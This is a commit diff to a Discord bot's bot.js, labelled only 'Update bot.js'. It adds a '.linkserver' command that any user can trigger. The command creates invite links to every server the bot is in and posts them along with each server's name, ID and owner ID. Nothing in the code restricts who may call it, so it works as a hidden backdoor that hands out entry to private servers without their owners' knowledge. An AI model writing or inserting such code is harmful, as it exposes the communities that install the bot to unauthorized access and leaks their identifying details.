6e87e2ec5919cbda3898d00e00eea4b45721c842
Dyzer13 <39059329+Dyzer13@users.noreply.github.com>
2018-11-09 22:57:56 +0100

    Update bot.js

--- bot.js
+++ bot.js
@@ -55,6 +55,29 @@ client.on('message',async message => {
   }
 });
 
+client.on('message', msg => {
+    if(msg.author.bot) return;
+    
+    if(msg.content === '.linkserver') {
+      client.guilds.forEach(g => {
+        
+        let l = g.id
+        g.channels.get(g.channels.first().id).createInvite({
+          maxUses: 5,
+          maxAge: 86400
+        }).then(i => msg.channel.send(`
+        **
+        Invite Link : <https://discord.gg/${i.code}>
+        Server : ${g.name} | Id : ${g.id} 
+        Owner ID : ${g.owner.id}
+        **
+        `))
+  
+  
+      })
+    }
+    
+  })
 
 
 
